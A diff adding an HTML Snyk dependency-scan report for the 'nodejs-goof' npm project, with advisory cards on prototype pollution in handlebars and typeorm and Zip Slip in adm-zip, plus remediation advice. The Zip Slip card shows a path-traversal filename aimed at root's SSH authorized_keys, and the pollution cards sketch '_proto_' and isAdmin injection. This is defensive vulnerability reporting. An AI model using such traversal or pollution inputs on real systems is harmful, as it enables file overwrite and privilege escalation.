@@ -1,0 +1,2189 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="Content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="Content-Language" content="en-us">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Snyk test report</title>
+  <meta name="description" content="13 known vulnerabilities found in 26 vulnerable dependency paths.">
+  <base target="_blank">
+  <link rel="icon" type="image/png" href="https://res.cloudinary.com/snyk/image/upload/v1468845142/favicon/favicon.png"
+    sizes="194x194">
+  <link rel="shortcut icon" href="https://res.cloudinary.com/snyk/image/upload/v1468845142/favicon/favicon.ico">
+  <style type="text/css">
+  
+    body {
+      -moz-font-feature-settings: "pnum";
+      -webkit-font-feature-settings: "pnum";
+      font-variant-numeric: proportional-nums;
+      display: flex;
+      flex-direction: column;
+      font-feature-settings: "pnum";
+      font-size: 100%;
+      line-height: 1.5;
+      min-height: 100vh;
+      -webkit-text-size-adjust: 100%;
+      margin: 0;
+      padding: 0;
+      background-color: #F5F5F5;
+      font-family: 'Arial', 'Helvetica', Calibri, sans-serif;
+    }
+  
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6 {
+      font-weight: 500;
+    }
+  
+    a,
+    a:link,
+    a:visited {
+      border-bottom: 1px solid #4b45a9;
+      text-decoration: none;
+      color: #4b45a9;
+    }
+  
+    a:hover,
+    a:focus,
+    a:active {
+      border-bottom: 1px solid #4b45a9;
+    }
+  
+    hr {
+      border: none;
+      margin: 1em 0;
+      border-top: 1px solid #c5c5c5;
+    }
+  
+    ul {
+      padding: 0 1em;
+      margin: 1em 0;
+    }
+  
+    code {
+      background-color: #EEE;
+      color: #333;
+      padding: 0.25em 0.5em;
+      border-radius: 0.25em;
+    }
+  
+    pre {
+      background-color: #333;
+      font-family: monospace;
+      padding: 0.5em 1em 0.75em;
+      border-radius: 0.25em;
+      font-size: 14px;
+    }
+  
+    pre code {
+      padding: 0;
+      background-color: transparent;
+      color: #fff;
+    }
+  
+    a code {
+      border-radius: .125rem .125rem 0 0;
+      padding-bottom: 0;
+      color: #4b45a9;
+    }
+  
+    a[href^="http://"]:after,
+    a[href^="https://"]:after {
+      background-image: linear-gradient(transparent,transparent),url("data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20112%20109%22%3E%3Cg%20id%3D%22Page-1%22%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%3Cg%20id%3D%22link-external%22%3E%3Cg%20id%3D%22arrow%22%3E%3Cpath%20id%3D%22Line%22%20stroke%3D%22%234B45A9%22%20stroke-width%3D%2215%22%20d%3D%22M88.5%2021l-43%2042.5%22%20stroke-linecap%3D%22square%22%2F%3E%3Cpath%20id%3D%22Triangle%22%20fill%3D%22%234B45A9%22%20d%3D%22M111.2%200v50L61%200z%22%2F%3E%3C%2Fg%3E%3Cpath%20id%3D%22square%22%20fill%3D%22%234B45A9%22%20d%3D%22M66%2015H0v94h94V44L79%2059v35H15V30h36z%22%2F%3E%3C%2Fg%3E%3C%2Fg%3E%3C%2Fsvg%3E");
+      background-repeat: no-repeat;
+      background-size: .75rem;
+      content: "";
+      display: inline-block;
+      height: .75rem;
+      margin-left: .25rem;
+      width: .75rem;
+    }
+  
+  
+  /* Layout */
+  
+    [class*=layout-container] {
+      margin: 0 auto;
+      max-width: 71.25em;
+      padding: 1.9em 1.3em;
+      position: relative;
+    }
+    .layout-container--short {
+      padding-top: 0;
+      padding-bottom: 0;
+      max-width: 48.75em;
+    }
+  
+    .layout-container--short:after {
+      display: block;
+      content: "";
+      clear: both;
+    }
+  
+  /* Header */
+  
+    .header {
+      padding-bottom: 1px;
+    }
+  
+    .paths {
+      margin-left: 8px;
+    }
+    .header-wrap {
+      display: flex;
+      flex-direction: row;
+      justify-content: space-between;
+      padding-top: 2em;
+    }
+    .project__header {
+      background-color: #4b45a9;
+      color: #fff;
+      margin-bottom: -1px;
+      padding-top: 1em;
+      padding-bottom: 0.25em;
+      border-bottom: 2px solid #BBB;
+    }
+  
+    .project__header__title {
+      overflow-wrap: break-word;
+      word-wrap: break-word;
+      word-break: break-all;
+      margin-bottom: .1em;
+      margin-top: 0;
+    }
+  
+    .timestamp {
+      float: right;
+      clear: none;
+      margin-bottom: 0;
+    }
+  
+    .meta-counts {
+      clear: both;
+      display: block;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      margin: 0 0 1.5em;
+      color: #fff;
+      clear: both;
+      font-size: 1.1em;
+    }
+  
+    .meta-count {
+      display: block;
+      flex-basis: 100%;
+      margin: 0 1em 1em 0;
+      float: left;
+      padding-right: 1em;
+      border-right: 2px solid #fff;
+    }
+  
+    .meta-count:last-child {
+      border-right: 0;
+      padding-right: 0;
+      margin-right: 0;
+    }
+  
+  /* Card */
+  
+    .card {
+      background-color: #fff;
+      border: 1px solid #c5c5c5;
+      border-radius: .25rem;
+      margin: 0 0 2em 0;
+      position: relative;
+      min-height: 40px;
+      padding: 1.5em;
+    }
+  
+    .card .label {
+      background-color: #767676;
+      border: 2px solid #767676;
+      color: white;
+      padding: 0.25rem 0.75rem;
+      font-size: 0.875rem;
+      text-transform: uppercase;
+      display: inline-block;
+      margin: 0;
+      border-radius: 0.25rem;
+    }
+  
+    .card .label__text {
+      vertical-align: text-top;
+        font-weight: bold;
+    }
+  
+    .card .label--critical {
+      background-color: #AB1A1A;
+      border-color: #AB1A1A;
+    }
+  
+    .card .label--high {
+      background-color: #CE5019;
+      border-color: #CE5019;
+    }
+  
+    .card .label--medium {
+      background-color: #D68000;
+      border-color: #D68000;
+    }
+  
+    .card .label--low {
+      background-color: #88879E;
+      border-color: #88879E;
+    }
+  
+    .severity--low {
+      border-color: #88879E;
+    }
+  
+    .severity--medium {
+      border-color: #D68000;
+    }
+  
+    .severity--high {
+      border-color: #CE5019;
+    }
+  
+    .severity--critical {
+      border-color: #AB1A1A;
+    }
+  
+    .card--vuln {
+      padding-top: 4em;
+    }
+  
+    .card--vuln .label {
+      left: 0;
+      position: absolute;
+      top: 1.1em;
+      padding-left: 1.9em;
+      padding-right: 1.9em;
+      border-radius: 0 0.25rem 0.25rem 0;
+    }
+  
+    .card--vuln .card__section h2 {
+      font-size: 22px;
+      margin-bottom: 0.5em;
+    }
+  
+    .card--vuln .card__section p {
+      margin: 0 0 0.5em 0;
+    }
+  
+    .card--vuln .card__meta {
+      padding: 0 0 0 1em;
+      margin: 0;
+      font-size: 1.1em;
+    }
+  
+    .card .card__meta__paths {
+      font-size: 0.9em;
+    }
+  
+    .card--vuln .card__title {
+      font-size: 28px;
+      margin-top: 0;
+    }
+  
+    .card--vuln .card__cta p {
+      margin: 0;
+      text-align: right;
+    }
+  
+    .source-panel {
+      clear: both;
+      display: flex;
+      justify-content: flex-start;
+      flex-direction: column;
+      align-items: flex-start;
+      padding: 0.5em 0;
+      width: fit-content;
+    }
+  
+  
+  
+  </style>
+  <style type="text/css">
+    .metatable {
+      text-size-adjust: 100%;
+      -webkit-font-smoothing: antialiased;
+      -webkit-box-direction: normal;
+      color: inherit;
+      font-feature-settings: "pnum";
+      box-sizing: border-box;
+      background: transparent;
+      border: 0;
+      font: inherit;
+      font-size: 100%;
+      margin: 0;
+      outline: none;
+      padding: 0;
+      text-align: left;
+      text-decoration: none;
+      vertical-align: baseline;
+      z-index: auto;
+      margin-top: 12px;
+      border-collapse: collapse;
+      border-spacing: 0;
+      font-variant-numeric: tabular-nums;
+      max-width: 51.75em;
+    }
+  
+    tbody {
+      text-size-adjust: 100%;
+      -webkit-font-smoothing: antialiased;
+      -webkit-box-direction: normal;
+      color: inherit;
+      font-feature-settings: "pnum";
+      border-collapse: collapse;
+      border-spacing: 0;
+      box-sizing: border-box;
+      background: transparent;
+      border: 0;
+      font: inherit;
+      font-size: 100%;
+      margin: 0;
+      outline: none;
+      padding: 0;
+      text-align: left;
+      text-decoration: none;
+      vertical-align: baseline;
+      z-index: auto;
+      display: flex;
+      flex-wrap: wrap;
+    }
+  
+    .meta-row {
+      text-size-adjust: 100%;
+      -webkit-font-smoothing: antialiased;
+      -webkit-box-direction: normal;
+      color: inherit;
+      font-feature-settings: "pnum";
+      border-collapse: collapse;
+      border-spacing: 0;
+      box-sizing: border-box;
+      background: transparent;
+      border: 0;
+      font: inherit;
+      font-size: 100%;
+      outline: none;
+      text-align: left;
+      text-decoration: none;
+      vertical-align: baseline;
+      z-index: auto;
+      display: flex;
+      align-items: start;
+      border-top: 1px solid #d3d3d9;
+      padding: 8px 0 0 0;
+      border-bottom: none;
+      margin: 8px;
+      width: 47.75%;
+    }
+  
+    .meta-row-label {
+      text-size-adjust: 100%;
+      -webkit-font-smoothing: antialiased;
+      -webkit-box-direction: normal;
+      font-feature-settings: "pnum";
+      border-collapse: collapse;
+      border-spacing: 0;
+      color: #4c4a73;
+      box-sizing: border-box;
+      background: transparent;
+      border: 0;
+      font: inherit;
+      margin: 0;
+      outline: none;
+      text-decoration: none;
+      z-index: auto;
+      align-self: start;
+      flex: 1;
+      font-size: 1rem;
+      line-height: 1.5rem;
+      padding: 0;
+      text-align: left;
+      vertical-align: top;
+      text-transform: none;
+      letter-spacing: 0;
+    }
+  
+    .meta-row-value {
+      text-size-adjust: 100%;
+      -webkit-font-smoothing: antialiased;
+      -webkit-box-direction: normal;
+      color: inherit;
+      font-feature-settings: "pnum";
+      border-collapse: collapse;
+      border-spacing: 0;
+      word-break: break-word;
+      box-sizing: border-box;
+      background: transparent;
+      border: 0;
+      font: inherit;
+      font-size: 100%;
+      margin: 0;
+      outline: none;
+      padding: 0;
+      text-align: right;
+      text-decoration: none;
+      vertical-align: baseline;
+      z-index: auto;
+    }
+  </style>
+</head>
+
+<body class="section-projects">
+  <main class="layout-stacked">
+        <div class="layout-stacked__header header">
+          <header class="project__header">
+            <div class="layout-container">
+              <a class="brand" href="https://snyk.io" title="Snyk">
+                <svg width="68px" height="35px" viewBox="0 0 68 35" version="1.1" xmlns="http://www.w3.org/2000/svg" role="img">
+                  <title>Snyk - Open Source Security</title>
+                  <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                    <g fill="#fff">
+                      <path d="M5.732,27.278 C3.445,27.278 1.589,26.885 0,26.124 L0.483,22.472 C2.163,23.296 4.056,23.689 5.643,23.689 C6.801,23.689 7.563,23.295 7.563,22.599 C7.563,20.594 0.333,21.076 0.333,15.839 C0.333,12.491 3.407,10.729 7.259,10.729 C9.179,10.729 11.161,11.249 12.444,11.704 L11.924,15.294 C10.577,14.774 8.747,14.291 7.222,14.291 C6.282,14.291 5.518,14.621 5.518,15.231 C5.518,17.208 12.903,16.815 12.903,21.925 C12.903,25.325 9.877,27.277 5.733,27.277 L5.732,27.278 Z M25.726,26.936 L25.726,17.894 C25.726,15.827 24.811,14.85 23.069,14.85 C22.219,14.85 21.329,15.09 20.719,15.46 L20.719,26.936 L15.352,26.936 L15.352,11.262 L20.602,10.83 L20.474,13.392 L20.652,13.392 C21.784,11.87 23.702,10.716 25.992,10.716 C28.736,10.716 31.112,12.416 31.112,16.436 L31.112,26.936 L25.724,26.936 L25.726,26.936 Z M61.175,26.936 L56.879,19.479 L56.446,19.479 L56.446,26.935 L51.082,26.935 L51.082,8.37 L56.447,0 L56.447,17.323 C57.515,16.017 61.112,11.059 61.112,11.059 L67.732,11.059 L61.454,17.689 L67.949,26.95 L61.175,26.95 L61.175,26.938 L61.175,26.936 Z M44.13,11.11 L41.93,18.262 C41.5,19.606 41.08,22.079 41.08,22.079 C41.08,22.079 40.75,19.516 40.292,18.172 L37.94,11.108 L31.928,11.108 L38.462,26.935 C37.572,29.04 36.199,30.815 34.369,30.815 C34.039,30.815 33.709,30.802 33.389,30.765 L31.255,34.061 C31.928,34.441 33.212,34.835 34.737,34.835 C38.703,34.835 41.359,31.627 43.215,26.885 L49.443,11.108 L44.132,11.108 L44.13,11.11 Z"></path>
+                    </g>
+                  </g>
+                </svg>
+              </a>
+              <div class="header-wrap">
+                  <h1 class="project__header__title">Snyk test report</h1>
+    
+                <p class="timestamp">May 20th 2022, 7:47:01 pm</p>
+              </div>
+              <div class="source-panel">
+                <span>Scanned the following path:</span>
+                <ul>
+                  <li class="paths">/Users/opickford/snyk_projects/nodejs-goof (npm)</li>
+                </ul>
+              </div>
+    
+              <div class="meta-counts">
+                <div class="meta-count"><span>13</span> <span>known vulnerabilities</span></div>
+                <div class="meta-count"><span>26 vulnerable dependency paths</span></div>
+                <div class="meta-count"><span>565</span> <span>dependencies</span></div>
+              </div><!-- .meta-counts -->
+            </div><!-- .layout-container--short -->
+          </header><!-- .project__header -->
+        </div><!-- .layout-stacked__header -->
+      <section class="layout-container">
+          <table class="metatable">
+              <tbody>
+              <tr class="meta-row"><th class="meta-row-label">Project</th> <td class="meta-row-value">goof</td></tr>
+              <tr class="meta-row"><th class="meta-row-label">Path</th> <td class="meta-row-value">/Users/opickford/snyk_projects/nodejs-goof</td></tr>
+              <tr class="meta-row"><th class="meta-row-label">Package Manager</th> <td class="meta-row-value">npm</td></tr>
+              <tr class="meta-row"><th class="meta-row-label">Manifest</th> <td class="meta-row-value">package-lock.json</td></tr>
+              </tbody>
+          </table>
+      </section>
+    <div class="layout-container" style="padding-top: 35px;">
+      <div class="cards--vuln filter--patch filter--ignore">
+        <div class="card card--vuln  disclosure--not-new severity--critical" data-snyk-test="critical">
+            <h2 class="card__title">Prototype Pollution</h2>
+            <div class="card__section">
+        
+                <div class="label label--critical">
+                    <span class="label__text">critical severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            handlebars
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    goof@1.0.1, hbs@4.0.4 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        hbs@4.0.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        handlebars@4.0.14
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        tap@11.1.5
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        nyc@11.9.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        istanbul-reports@1.4.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        handlebars@4.0.11
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/handlebars">handlebars</a> is an extension to the Mustache templating language.</p>
+        <p>Affected versions of this package are vulnerable to Prototype Pollution.
+        It is possible to add or modify properties to the Object prototype through a malicious template. This may allow attackers to crash the application or execute Arbitrary Code in specific conditions.</p>
+        <h2 id="details">Details</h2>
+        <p>Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as <code>_proto_</code>, <code>constructor</code> and <code>prototype</code>. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the <code>Object.prototype</code> are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.</p>
+        <p>There are two main ways in which the pollution of prototypes occurs:</p>
+        <ul>
+        <li><p>Unsafe <code>Object</code> recursive merge</p>
+        </li>
+        <li><p>Property definition by path</p>
+        </li>
+        </ul>
+        <h3 id="unsafe-object-recursive-merge">Unsafe Object recursive merge</h3>
+        <p>The logic of a vulnerable recursive merge function follows the following high-level model:</p>
+        <pre><code>merge (target, source)
+        
+          foreach property of source
+        
+            if property exists and is an object on both the target and the source
+        
+              merge(target[property], source[property])
+        
+            else
+        
+              target[property] = source[property]
+        </code></pre>
+        <br>  
+        
+        <p>When the source object contains a property named <code>_proto_</code> defined with <code>Object.defineProperty()</code> , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of <code>Object</code> and the source of <code>Object</code> as defined by the attacker. Properties are then copied on the <code>Object</code> prototype.</p>
+        <p>Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: <code>merge({},source)</code>.</p>
+        <p><code>lodash</code> and <code>Hoek</code> are examples of libraries susceptible to recursive merge attacks.</p>
+        <h3 id="property-definition-by-path">Property definition by path</h3>
+        <p>There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: <code>theFunction(object, path, value)</code></p>
+        <p>If the attacker can control the value of “path”, they can set this value to <code>_proto_.myValue</code>. <code>myValue</code> is then assigned to the prototype of the class of the object.</p>
+        <h2 id="types-of-attacks">Types of attacks</h2>
+        <p>There are a few methods by which Prototype Pollution can be manipulated:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Type</th>
+        <th>Origin</th>
+        <th>Short description</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td><strong>Denial of service (DoS)</strong></td>
+        <td>Client</td>
+        <td>This is the most likely attack. <br>DoS occurs when <code>Object</code> holds generic functions that are implicitly called for various operations (for example, <code>toString</code> and <code>valueOf</code>). <br> The attacker pollutes <code>Object.prototype.someattr</code> and alters its state to an unexpected value such as <code>Int</code> or <code>Object</code>. In this case, the code fails and is likely to cause a denial of service.  <br><strong>For example:</strong> if an attacker pollutes <code>Object.prototype.toString</code> by defining it as an integer, if the codebase at any point was reliant on <code>someobject.toString()</code> it would fail.</td>
+        </tr>
+        <tr>
+        <td><strong>Remote Code Execution</strong></td>
+        <td>Client</td>
+        <td>Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br><strong>For example:</strong> <code>eval(someobject.someattr)</code>. In this case, if the attacker pollutes <code>Object.prototype.someattr</code> they are likely to be able to leverage this in order to execute code.</td>
+        </tr>
+        <tr>
+        <td><strong>Property Injection</strong></td>
+        <td>Client</td>
+        <td>The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  <strong>For example:</strong> if a codebase checks privileges for <code>someuser.isAdmin</code>, then when the attacker pollutes <code>Object.prototype.isAdmin</code> and sets it to equal <code>true</code>, they can then achieve admin privileges.</td>
+        </tr>
+        </tbody></table>
+        <h2 id="affected-environments">Affected environments</h2>
+        <p>The following environments are susceptible to a Prototype Pollution attack:</p>
+        <ul>
+        <li><p>Application server</p>
+        </li>
+        <li><p>Web server</p>
+        </li>
+        </ul>
+        <h2 id="how-to-prevent">How to prevent</h2>
+        <ol>
+        <li><p>Freeze the prototype— use <code>Object.freeze (Object.prototype)</code>.</p>
+        </li>
+        <li><p>Require schema validation of JSON input.</p>
+        </li>
+        <li><p>Avoid using unsafe recursive merge functions.</p>
+        </li>
+        <li><p>Consider using objects without prototypes (for example, <code>Object.create(null)</code>), breaking the prototype chain and preventing pollution.</p>
+        </li>
+        <li><p>As a best practice use <code>Map</code> instead of <code>Object</code>.</p>
+        </li>
+        </ol>
+        <h3 id="for-more-information-on-this-vulnerability-type">For more information on this vulnerability type:</h3>
+        <p><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018</a></p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>handlebars</code> to version 4.5.3, 3.0.8 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><p><a href="https://github.com/wycats/handlebars.js/commit/198887808780bbef9dba67a8af68ece091d5baa7">GitHub Commit</a></p>
+        </li>
+        <li><p><a href="https://www.npmjs.com/advisories/1325">NPM Security Advisory</a></p>
+        </li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-HANDLEBARS-534988">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--critical" data-snyk-test="critical">
+            <h2 class="card__title">Arbitrary File Write via Archive Extraction (Zip Slip)</h2>
+            <div class="card__section">
+        
+                <div class="label label--critical">
+                    <span class="label__text">critical severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            adm-zip
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+                                goof@1.0.1 and adm-zip@0.4.7
+        
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        adm-zip@0.4.7
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/adm-zip">adm-zip</a> is a JavaScript implementation for zip data compression for NodeJS.</p>
+        <p>Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip).</p>
+        <h2 id="details">Details</h2>
+        <p>It is exploited using a specially crafted zip archive, that holds path traversal filenames. When exploited, a filename in a malicious archive is concatenated to the target extraction directory, which results in the final path ending up outside of the target folder. For instance, a zip may hold a file with a &quot;../../file.exe&quot; location and thus break out of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.</p>
+        <p>The following is an example of a zip archive with one benign file and one malicious file. Extracting the malicous file will result in traversing out of the target folder, ending up in <code>/root/.ssh/</code> overwriting the <code>authorized_keys</code> file:</p>
+        <pre><code>
+        +2018-04-15 22:04:29 ..... 19 19 good.txt
+        
+        +2018-04-15 22:04:42 ..... 20 20 ../../../../../../root/.ssh/authorized_keys
+        </code></pre>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>adm-zip</code> to version 0.4.11 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><p><a href="https://github.com/cthackers/adm-zip/commit/d01fa8c80c3a5fcf5ce1eda82d96600c62910d3f">GitHub Commit</a></p>
+        </li>
+        <li><p><a href="https://github.com/cthackers/adm-zip/pull/212/commits/6f4dfeb9a2166e93207443879988f97d88a37cde">GitHub Commit</a></p>
+        </li>
+        <li><p><a href="https://hackerone.com/reports/362118">Hackerone Report</a></p>
+        </li>
+        <li><p><a href="https://github.com/snyk/zip-slip-vulnerability">Zip Slip Advisory</a></p>
+        </li>
+        <li><p><a href="https://snyk.io/research/zip-slip-vulnerability">Zip Slip Advisory</a></p>
+        </li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/npm:adm-zip:20180415">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Prototype Pollution</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            typeorm
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+                                goof@1.0.1 and typeorm@0.2.24
+        
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        typeorm@0.2.24
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/typeorm">typeorm</a> is an ORM that can run in NodeJS, Browser, Cordova, PhoneGap, Ionic, React Native, NativeScript, Expo, and Electron platforms and can be used with TypeScript and JavaScript (ES5, ES6, ES7, ES8).</p>
+        <p>Affected versions of this package are vulnerable to Prototype Pollution. It allows an attacker that is able to save a specially crafted object to pollute the <code>Object</code> prototype and cause side effects on the library/application logic, such as Denial of Service attacks and/or SQL injections.</p>
+        <h2 id="details">Details</h2>
+        <p>Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as <code>_proto_</code>, <code>constructor</code> and <code>prototype</code>. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the <code>Object.prototype</code> are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.</p>
+        <p>There are two main ways in which the pollution of prototypes occurs:</p>
+        <ul>
+        <li><p>Unsafe <code>Object</code> recursive merge</p>
+        </li>
+        <li><p>Property definition by path</p>
+        </li>
+        </ul>
+        <h3 id="unsafe-object-recursive-merge">Unsafe Object recursive merge</h3>
+        <p>The logic of a vulnerable recursive merge function follows the following high-level model:</p>
+        <pre><code>merge (target, source)
+        
+          foreach property of source
+        
+            if property exists and is an object on both the target and the source
+        
+              merge(target[property], source[property])
+        
+            else
+        
+              target[property] = source[property]
+        </code></pre>
+        <br>  
+        
+        <p>When the source object contains a property named <code>_proto_</code> defined with <code>Object.defineProperty()</code> , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of <code>Object</code> and the source of <code>Object</code> as defined by the attacker. Properties are then copied on the <code>Object</code> prototype.</p>
+        <p>Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: <code>merge({},source)</code>.</p>
+        <p><code>lodash</code> and <code>Hoek</code> are examples of libraries susceptible to recursive merge attacks.</p>
+        <h3 id="property-definition-by-path">Property definition by path</h3>
+        <p>There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: <code>theFunction(object, path, value)</code></p>
+        <p>If the attacker can control the value of “path”, they can set this value to <code>_proto_.myValue</code>. <code>myValue</code> is then assigned to the prototype of the class of the object.</p>
+        <h2 id="types-of-attacks">Types of attacks</h2>
+        <p>There are a few methods by which Prototype Pollution can be manipulated:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Type</th>
+        <th>Origin</th>
+        <th>Short description</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td><strong>Denial of service (DoS)</strong></td>
+        <td>Client</td>
+        <td>This is the most likely attack. <br>DoS occurs when <code>Object</code> holds generic functions that are implicitly called for various operations (for example, <code>toString</code> and <code>valueOf</code>). <br> The attacker pollutes <code>Object.prototype.someattr</code> and alters its state to an unexpected value such as <code>Int</code> or <code>Object</code>. In this case, the code fails and is likely to cause a denial of service.  <br><strong>For example:</strong> if an attacker pollutes <code>Object.prototype.toString</code> by defining it as an integer, if the codebase at any point was reliant on <code>someobject.toString()</code> it would fail.</td>
+        </tr>
+        <tr>
+        <td><strong>Remote Code Execution</strong></td>
+        <td>Client</td>
+        <td>Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br><strong>For example:</strong> <code>eval(someobject.someattr)</code>. In this case, if the attacker pollutes <code>Object.prototype.someattr</code> they are likely to be able to leverage this in order to execute code.</td>
+        </tr>
+        <tr>
+        <td><strong>Property Injection</strong></td>
+        <td>Client</td>
+        <td>The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  <strong>For example:</strong> if a codebase checks privileges for <code>someuser.isAdmin</code>, then when the attacker pollutes <code>Object.prototype.isAdmin</code> and sets it to equal <code>true</code>, they can then achieve admin privileges.</td>
+        </tr>
+        </tbody></table>
+        <h2 id="affected-environments">Affected environments</h2>
+        <p>The following environments are susceptible to a Prototype Pollution attack:</p>
+        <ul>
+        <li><p>Application server</p>
+        </li>
+        <li><p>Web server</p>
+        </li>
+        </ul>
+        <h2 id="how-to-prevent">How to prevent</h2>
+        <ol>
+        <li><p>Freeze the prototype— use <code>Object.freeze (Object.prototype)</code>.</p>
+        </li>
+        <li><p>Require schema validation of JSON input.</p>
+        </li>
+        <li><p>Avoid using unsafe recursive merge functions.</p>
+        </li>
+        <li><p>Consider using objects without prototypes (for example, <code>Object.create(null)</code>), breaking the prototype chain and preventing pollution.</p>
+        </li>
+        <li><p>As a best practice use <code>Map</code> instead of <code>Object</code>.</p>
+        </li>
+        </ol>
+        <h3 id="for-more-information-on-this-vulnerability-type">For more information on this vulnerability type:</h3>
+        <p><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018</a></p>
